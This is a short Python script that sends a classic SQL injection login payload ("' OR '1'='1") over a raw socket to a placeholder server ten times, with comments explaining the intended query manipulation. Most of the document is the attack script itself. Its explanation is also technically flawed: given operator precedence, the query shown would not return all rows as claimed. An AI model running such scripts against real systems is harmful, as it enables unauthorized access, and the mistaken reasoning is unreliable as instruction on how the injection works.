
'''

This code simulates a basic SQL injection attack using socket programming in Python. It targets a specific 
IP address and port, sending a crafted payload in the form of a username and password to exploit SQL vulnerabilities. 
The sql_injection_attack function connects to the target server, sends the malicious request, and prints the server's 
response. The script sends this malicious request a specified number of times (10 in this case).

'''


import socket

target_ip = "111.11.11.111"  # IP address of the target server
target_port = 9999

def sql_injection_attack():
    payload = "' OR '1'='1"
    message = f"username={payload}&password=anything"

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((target_ip, target_port))
        s.sendall(message.encode())
        response = s.recv(1024)
        print(f"Received: {response.decode()}")

# Number of requests to send
num_requests = 10

for _ in range(num_requests):
    sql_injection_attack()

'''
When the server receives this message, it might try to process it as part of an SQL query. For example, if the server 
constructs an SQL query like this:

SELECT * FROM users WHERE username = 'username' AND password = 'password';
With the payload inserted, the query might become:

SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything';
Since '1'='1' is always true, this query would return all rows from the users table, potentially allowing unauthorized access. 
The payload is designed to exploit this kind of vulnerability, and the message encapsulates this payload in the format expected by the server.
'''